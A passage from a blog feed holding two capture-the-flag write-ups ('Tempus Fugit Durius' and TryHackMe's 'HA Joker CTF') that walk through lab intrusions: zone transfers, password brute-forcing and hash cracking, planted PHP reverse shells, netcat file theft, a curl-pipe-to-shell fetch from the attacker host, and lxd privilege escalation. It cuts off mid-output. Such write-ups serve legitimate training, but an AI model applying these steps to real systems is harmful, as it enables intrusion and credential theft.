+&lt;p&gt;After an hour and a half I get a very large output, but notably, the host &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.150.100&lt;/code&gt; has port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;53&lt;/code&gt; open, a DNS server port. I run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig axfr mofo.pwn @192.168.150.100&lt;/code&gt; and receive the following output:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.4$ dig axfr mofo.pwn @192.168.150.100
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.8 &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr mofo.pwn @192.168.150.100
+;; global options: +cmd
+mofo.pwn.               14400   IN      SOA     ns1.mofo.pwn. admin.mofo.pwn. 14 7200 120 2419200 604800
+mofo.pwn.               14400   IN      TXT     &quot;v=spf1 ip4:176.23.46.22 a mx ~all&quot;
+mofo.pwn.               14400   IN      NS      ns1.mofo.pwn.
+durius.mofo.pwn.        14400   IN      A       192.168.150.1
+ftp.mofo.pwn.           14400   IN      CNAME   punk.mofo.pwn.
+gary.mofo.pwn.          14400   IN      A       192.168.150.15
+geek.mofo.pwn.          14400   IN      A       192.168.150.14
+kfc.mofo.pwn.           14400   IN      A       192.168.150.17
+leet.mofo.pwn.          14400   IN      A       192.168.150.13
+mail.mofo.pwn.          14400   IN      TXT     &quot;v=spf1 a -all&quot;
+mail.mofo.pwn.          14400   IN      A       192.168.150.11
+milo.mofo.pwn.          14400   IN      A       192.168.150.16
+newcms.mofo.pwn.        14400   IN      CNAME   durius.mofo.pwn.
+ns1.mofo.pwn.           14400   IN      A       192.168.150.100
+punk.mofo.pwn.          14400   IN      A       192.168.150.12
+sid.mofo.pwn.           14400   IN      A       192.168.150.10
+www.mofo.pwn.           14400   IN      CNAME   sid.mofo.pwn.
+mofo.pwn.               14400   IN      SOA     ns1.mofo.pwn. admin.mofo.pwn. 14 7200 120 2419200 604800
+;; Query time: 0 msec
+;; SERVER: 192.168.150.100#53(192.168.150.100)
+;; WHEN: Fri Oct 23 23:53:32 UTC 2020
+;; XFR size: 18 records (messages 1, bytes 467)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Notably, the hostname &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newcms.mofo.pwn&lt;/code&gt; is linked to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.150.1&lt;/code&gt; by a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CNAME&lt;/code&gt; (Alias) record. Using &lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/&quot;&gt;FoxyProxy&lt;/a&gt;, I change my browser’s proxy settings to go through the SOCKS5 proxy that I previously set up.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/FoxyProxy.png&quot; alt=&quot;Screenshot of FoxyProxy Settings Tab&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I’m then allowed to visit that host using my browser. Since it’s hosting an open source CMS named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;batflat&lt;/code&gt;, I check the &lt;a href=&quot;https://github.com/sruupl/batflat&quot;&gt;Github repo&lt;/a&gt; and find that the admin login page is at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Admin_Login.png&quot; alt=&quot;Screenshot of Admin Login Page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I use the credentials found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;creds.txt&lt;/code&gt; from the FTP server to successfully log in. Then, I edit a page to include a Linux-PHP reverse shell and catch it with netcat.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/PHP_Reverse_Shell.png&quot; alt=&quot;Screenshot of Edit Page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Catching_PHP_Shell.png&quot; alt=&quot;Screenshot of Catching PHP Shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After digging around the file system, I find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database.sdb&lt;/code&gt; file for the website. I transfer it to my local machine using netcat. For file transfers which could take longer, I use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tail -f&lt;/code&gt; to watch as data is appended to the file, to make sure that the file transfer has completed before I stop the netcat connection.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/File_Transfer.png&quot; alt=&quot;Screenshot of File Transfer&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlite3&lt;/code&gt; to navigate through the database.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@dullahan: sqlite3 database.sdb 
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter &quot;.help&quot; for usage hints.
+sqlite&amp;gt; .tables
+blog                    login_attempts          remember_me           
+blog_tags               modules                 settings              
+blog_tags_relationship  navs                    snippets              
+galleries               navs_items              users                 
+galleries_items         pages                 
+sqlite&amp;gt; select * from users;
+1|admin|Hugh Gant|My name is Hugh Gant. Da boss|$2y$10$HvIMA&amp;lt;--Snipped!--&amp;gt;ower@mofo.pwn|admin|all
+sqlite&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I swap over to my Windows machine to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PS C:\Users\Orian\Documents\tools\Hashcat\hashcat-6.1.1&amp;gt; .\hashcat.exe -a 0 -m 3200 .\hash.txt ..\..\rockyou.txt&lt;/code&gt; to crack the hash.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Hashcat.png&quot; alt=&quot;Screenshot of Hashcat Result&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I use the recovered password to SSH into machine as user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;benclower&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/SSH.png&quot; alt=&quot;Screenshot of SSH as Ben Clower&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And that’s the user flag!
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
+&lt;p&gt;The first thing I did was use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl 10.13.1.225:9090/linpeas.sh | sh | tee peas.txt&lt;/code&gt; to transfer over &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; and execute it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh&lt;/code&gt;, then fork the outputs to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;peas.txt&lt;/code&gt; for further examination. The privesc script discovered a strange &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SGID&lt;/code&gt; binary that I had never seen before, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/ispell&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] SGID                                           
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                           
+/usr/bin/chage                                     
+/usr/bin/ssh-agent                                 
+/usr/bin/mutt_dotlock                              
+/usr/bin/lockfile                                  
+/usr/bin/mlocate                                   
+/usr/bin/bsd-write                                 
+/usr/bin/at             ---&amp;gt;    RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                                                                                
+/usr/bin/procmail                                  
+/usr/bin/expiry                                    
+/usr/bin/dotlockfile                               
+/usr/bin/wall                                      
+/usr/bin/crontab                                   
+/usr/bin/ispell                                    
+/sbin/unix_chkpwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After doing some googling, I found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ispell&lt;/code&gt; is a simple spell-checking utility. It also a shell escape using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!&lt;/code&gt;, in a similar vein to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt;’s shell escape. I execute the shell escape and am now part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adm&lt;/code&gt; group.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/ispell.png&quot; alt=&quot;Screenshot of ispell Shell Escape&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find / -group adm 2&amp;gt;/dev/null&lt;/code&gt; to find all files owned by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adm&lt;/code&gt; group, I hone in on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/auth.log&lt;/code&gt;. I transfer that file to my local machine and exaime it with Sublime Text. Since I don’t expect an authentication log to log the passwords, I surmise that I’m probably looking for user-error. Perhaps they accidentally typed their password into the username field?&lt;/p&gt;
+
+&lt;p&gt;I &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CTRL+F&lt;/code&gt; for a few things, then eventually stumble upon the word &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;invalid&lt;/code&gt;, which finds me the entry for when the root user mis-typed their password into the username field.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Auth_Log.png&quot; alt=&quot;Screenshot of Auth Log&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then I &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su&lt;/code&gt; as root and get the second flag!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Root.png&quot; alt=&quot;Screenshot of Root&quot; /&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Archive - CTF Writeup - HA Joker CTF {THM}</title>
+   <link href="https://h0th.lol/2020/10/03/joker-ctf-writeup-archive"/>
+   <updated>2020-10-03T00:00:00-05:00</updated>
+   <id>https://h0th.lol/2020/10/03/joker-ctf-writeup-archive</id>
+   <content type="html">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;An archive of an old writeup I wrote about the THM room “HA Joker CTF”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Thank you to &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; for hosting &lt;a href=&quot;https://tryhackme.com/room/jokerctf&quot;&gt;HA Joker CTF&lt;/a&gt; and thank you to you for giving this writeup a chance, I appreciate you. This is my first box writeup, it was a lot of fun to do and I hope to create more in the future. I am always looking to improve my content so if you have any criticism, positive or negative, please feel free to tweet at me at &lt;a href=&quot;https://twitter.com/OrielOrielOriel&quot;&gt;@OrielOrielOriel&lt;/a&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;p&gt;As always, real hackers hack time, and as I value my time when doing CTFs I like to start with Rustscan. The following command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rustscan -r 1-65535 10.10.239.128 -u 5000 -- -oN scans/nmap.txt -A&lt;/code&gt; blasts all TCP ports on the target machine to quickly determine which ports are open, then automatically performs an nmap scan with the options &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oN scans/nmap.txt -A&lt;/code&gt;. The resulting nmap command yielded the following output, which I have trimmed to its relevant parts: 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
+| ssh-rsa AAAAB3NzaC1y&amp;lt;--Snipped!--&amp;gt;3yM5CxAQdqRKgFF
+|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE&amp;lt;--Snipped!--&amp;gt;EDFIzfQ=
+|   256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1&amp;lt;--Snipped!--&amp;gt;sv4RJMvN4B3r
+80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HA: Joker
+8080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Please enter the password.
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 401 Unauthorized
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can observe that three ports are open, an SSH server on port 22 and two web servers on ports 80 and 8080. At this point in a CTF, my assumption would be that I’d need to chain exploits on the web servers to gain access via SSH.&lt;/p&gt;
+
+&lt;p&gt;As it turns out, that assumption was incorrect. Nevertheless, my methodology in this situation remains the same. I use my browser to navigate to the default web server, located on port 80, and am greeted with the following Joker image:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Port_80_Home.png&quot; alt=&quot;Port 80 Web Server Home Page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It’s not much, and scrolling down only gives a gallery of posters with quotes from Batman movies. I check the source code, but I find nothing of importance to the completion of the CTF.&lt;/p&gt;
+
+&lt;p&gt;At this point I want to check out the other web server. But as I’ve said before, time management is important, so I run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirsearch -u 10.10.239.128 -E -w /opt/wordlists/dir-and-file-names.txt -t 15 --plain-text-report scans/dirsearch_80.txt&lt;/code&gt; to 
+bruteforce through potential directories on this web server while I check out the web server on port 8080. I navigate to the site using my browser and am greeted with the following screen:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Port_8080_Login.png&quot; alt=&quot;HTTP Basic Auth Login Screen on Port 8080&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It’s an HTTP Basic Authentication login prompt, which, unless I want to try some funny business, means I’m going to need to proccur a username and password to access the rest of the web server. This being a Joker/Batman themed box, I have my suspicions about what the username may be. But, since my dirsearch scan is wrapping up, I decide to wait and see if it returns any useful directories.&lt;/p&gt;
+
+&lt;p&gt;My dirsearch scan wraps up with the following output:
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;--Snipped!--&amp;gt;
+
+200     1KB  http://10.10.33.184:80/css/
+403   277B   http://10.10.33.184:80/icons/
+200     4KB  http://10.10.33.184:80/img/
+200     6KB  http://10.10.33.184:80/index.html
+200    94KB  http://10.10.33.184:80/phpinfo.php
+200    94KB  http://10.10.33.184:80/phpinfo.php/
+200   320B   http://10.10.33.184:80/secret.txt
+403   277B   http://10.10.33.184:80/server-status/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After navigating to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/secret.txt&lt;/code&gt; path, I find the following snippet of what seems to be an altercation between Batman and Joker.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Secret_txt.png&quot; alt=&quot;Conversation Between Batman and Joker&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well, that doesn’t exactly provide any additional information. With that said, since I was was already assuming that the login credentials would be Batman/Joker related, I choose to go ahead with an HTTP Basic Authentication bruteforce using the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joker&lt;/code&gt;. Here is the command I used: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra -l joker -P /opt/wordlists/rockyou.txt 10.10.239.128 http-get -s 8080 -v&lt;/code&gt;, and the resulting output:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Hydra.png&quot; alt=&quot;Hydra Command and Output&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I authenticate using those credentials and am greeted by a basic Joomla blog.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Port_8080_Home.png&quot; alt=&quot;Joomla Blog&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Splitting a CTF into Enumeration, User, and Root, is useful as an organizational tool. With that said, CTFs, or even real-world scenarios like penetration tests and red team engagements, cannot be adequately divided in such a way. And that is particularly the case because of the enumeration section. Simply put, we are constantly enumerating. With every new asset that is discovered, new foothold obtained, or new privilege gained, we enumerate again. Security engagements are a cyclical process of re-enumeration.&lt;/p&gt;
+
+&lt;p&gt;So although the enumeration truly never ends, I think this is a good point to segue into the next section. A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; shell is near.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;user&quot;&gt;User&lt;/h1&gt;
+
+&lt;p&gt;My first instinct when greeted with the login form is to try the same credentials which I used to pass through the HTTP Basic Authentication. I try that combination of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joker:&amp;lt;--Censored!--&amp;gt;&lt;/code&gt; but no dice, the creds don’t work.&lt;/p&gt;
+
+&lt;p&gt;I decide to launch another directory bruteforce, but on this webserver instead. Here is the command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster -u 10.10.239.128:8080 -w opt/wordlists/dirbuster/directory-list-2.3-small.txt -x .txt,.zip,.html,.php -t 15 -o scans/gobuster_8080.txt -U joker -P &amp;lt;--Censored!--&amp;gt;&lt;/code&gt;. I chose not to use dirsearch this time because it doesn’t support HTTP Basic Authentication, I’ll probably fork it and add that functionality in the future.&lt;/p&gt;
+
+&lt;p&gt;The interesting things found by the scan are an administrator login portal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/administrator&lt;/code&gt; but also what seems to be a backup file at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/backup.zip&lt;/code&gt;. I quickly try the credentials again in the administrator login, but as expected that does not work, then I navigate to the backup file and it triggers a download.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Backup.png&quot; alt=&quot;Download From /Backup.zip&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I save the file and attempt to unzip it using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unzip&lt;/code&gt; command, but I receive a prompt asking me for a password. As should be your first instinct in this situation, I check for password reuse and ta-dah! It accepts the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;--Censored!--&amp;gt;&lt;/code&gt; and I am able to unzip the file and view its contents.&lt;/p&gt;
+
+&lt;p&gt;But what could I have done had the Joker not reused their password? In CTF situations where I want to unlock a .zip file without knowing the password, one of the first things I try is a combination of Zip2John and JohnTheRipper. For those unaware, JohnTheRipper is far more than Hashcat’s slower little brother. It in fact comes with a suite of programs which are built to extract hashes from various file types, to then be cracked by the John password cracking tool.&lt;/p&gt;
+
+&lt;p&gt;So after using this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip2john loot/backup.zip &amp;gt; loot/zip_hash.txt&lt;/code&gt; to extract a hash from the backup.zip file, I then use John to crack that hash and find the password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/John_Zip_Hash.png&quot; alt=&quot;Using John to Crack a Hash&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After unzipping the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup.zip&lt;/code&gt; file we are provided two directories:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Loot.png&quot; alt=&quot;My Loot Directory: Contains backup.zip, db, site, zip_hash.txt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this case the information we need is located in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db&lt;/code&gt; directory. If you didn’t know, most modern websites utilize databases to store a lot of data about the site, including hashed passwords. I decide to use this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep db/ -r admin&lt;/code&gt; to dig out all the lines with the word “admin” in every file in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db&lt;/code&gt; directory. As we can see from the following image, the admin’s password hash has been found.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Grep_For_Admin.png&quot; alt=&quot;Grep of db Directory&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I toss John at that hash and it cracks within a few seconds:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/John_Admin_Hash.png&quot; alt=&quot;Using John to Crack the Joomla Hash&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like our username and password combination is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:&amp;lt;--Censored!--&amp;gt;&lt;/code&gt;. I test that login information at the admin portal and successfully authenticate into the administrator control panel.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Joomla_Admin_Panel.png&quot; alt=&quot;Joomla Administrator Control Panel&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With the ability to edit pages and plugins on a website, one can usually gain remote code execution. I navigate to the templates page, then edit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;error.php&lt;/code&gt; page with a Linux PHP reverse shell. When I navigate to a page that does not exist, the website will load the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;error.php&lt;/code&gt; page and launch a reverse shell to my Netcat listener. I would paste the Linux PHP Reverse Shell here but it’s really rather large so instead you click &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;here&lt;/a&gt; to be taken to a github where it is hosted.&lt;/p&gt;
+
+&lt;p&gt;I set up a Netcat listener then attempt to navigate to a page that does not exist, to trigger the reverse shell. As you can see from the following screenshot, I try to go the page &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php/henwo&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Henwo.png&quot; alt=&quot;Navigating to /index.php/henwo&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/User_Shell.png&quot; alt=&quot;Catching the Reverse Shell With Netcat&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And ta-dah! The reverse shell is caught by my Netcat listener and we have a user shell as www-data. In the next section I will demonstrate how to upgrade this reverse shell to allow for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backspace&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clear&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl+c&lt;/code&gt; functionality and then escalate my privileges to root. If you are observant, you can actually glean, from this screenshot alone, a key piece of information that hints at how to gain root privileges. 
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
+
+&lt;p&gt;To upgrade our reverse shell to have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clear&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backspace&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl+c&lt;/code&gt; functionality, I first try to find out if a version of Python is available to this user. I use the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;which&lt;/code&gt; against both “python” and “python3” to find that Python3 is available. I then use the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;&lt;/code&gt; which is a Python3 one-liner to import the pty module, then spawn a Python3 based pty session using the binary located at /bin/bash. This should allow us to backspace and use arrow keys to move our cursor around.&lt;/p&gt;
+
+&lt;p&gt;After this I do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export TERM=xterm&lt;/code&gt; to allow us to clear the screen. The final command to upgrade this shell is the easiest to mess up, as such, please use the following .gif for clarification.&lt;/p&gt;
+
+&lt;p&gt;I use the key combination &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl+z&lt;/code&gt; to background the Netcat process, returning me to my local terminal. Then, I type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stty raw -echo&lt;/code&gt; and hit enter. Now, I type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fg&lt;/code&gt; and hit enter. &lt;em&gt;Notice that the text&lt;/em&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fg&lt;/code&gt; &lt;em&gt;does not show up, this is because of the previous command which affects how our keyboard input is received by the hardware.&lt;/em&gt; I then type in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reset&lt;/code&gt;, hit enter, and we have a fully functioning shell on the victim machine which does not stop when we hit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl+c&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/joker/Full_Shell_Demo.gif&quot; alt=&quot;Gif Showcasing the Shell Upgrade&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, onto privilege escalation!&lt;/p&gt;
+
+&lt;p&gt;Usually, this moment in a CTF would have me enumerating by using automated tools such as linPEAS and looking around the box to find anything out of the ordinary. However, as you may have seen from when we got the intial shell, we know that our user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; is part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxd&lt;/code&gt; group. The lxd group is a group that typically allows a user to use LXD, which is a Linux container manager. By the nature of containers, they are usually required to be run by a highly privileged daemon. Since we are part of the lxd group, I suspect that we will be able to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxc&lt;/code&gt; to interface with the LXD daemon and escalate our privileges.&lt;/p&gt;
+
+&lt;p&gt;Since we’re dealing with containers, we’re likely to need a container image. You can find a compileable version of Alpine for Linux at &lt;a href=&quot;https://github.com/saghul/lxd-alpine-builder&quot;&gt;this&lt;/a&gt; Github page. Just clone the Github page and run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./build-alpine&lt;/code&gt; and it will generate an Alpine image for you.&lt;/p&gt;
+
+&lt;p&gt;I start by switching to the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt;. This is a directory that is highly likely to be writeable by even low privileged users. Then, I launch local HTTP server and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; to download my Alpine image. My HTTP server of choice is called Updog. It can be installed with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip3 install updog&lt;/code&gt;. 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/$ cd /dev/shm
+cd /dev/shm
+www-data@ubuntu:/dev/shm$ wget 10.13.1.225:9090/alpine-v3.12-x86_64-20200929_2146.tar.gz
+
+--2020-10-02 13:55:51--  http://10.13.1.225:9090/alpine-v3.12-x86_64-20200929_2146.tar.gz
+Connecting to 10.13.1.225:9090... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3194888 (3.0M) [application/x-tar]
+Saving to: 'alpine-v3.12-x86_64-20200929_2146.tar.gz'
+
+alpine-v3.12-x86_64 100%[===================&amp;gt;]   3.05M   704KB/s    in 8.9s    
+
+2020-10-02 13:56:01 (351 KB/s) - 'alpine-v3.12-x86_64-20200929_2146.tar.gz' saved [3194888/3194888]
